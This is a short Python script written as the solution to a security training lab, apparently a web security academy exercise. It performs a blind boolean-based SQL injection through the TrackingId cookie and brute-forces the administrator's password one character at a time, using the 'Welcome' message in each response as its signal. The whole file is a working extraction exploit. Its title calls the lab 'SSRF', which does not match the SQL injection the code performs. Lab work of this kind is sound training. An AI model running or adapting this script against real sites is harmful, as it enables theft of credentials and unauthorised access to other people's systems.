# Lab: Blind SSRF SQLi with conditional responses
import os
import sys
import urllib.parse
import requests
import urllib3
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")}


def get_admin_password(url):
    password = " "
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            cookies = {'TrackingId': 'xj3aMcfAD1xCa7oZ' + sqli_payload_encoded,
                       'session': 'iq6NArLz4vaoHzDEirb87Ydw5wd1YAko'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()
            else:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]

    get_admin_password(url)


if __name__ == "__main__":
    main()




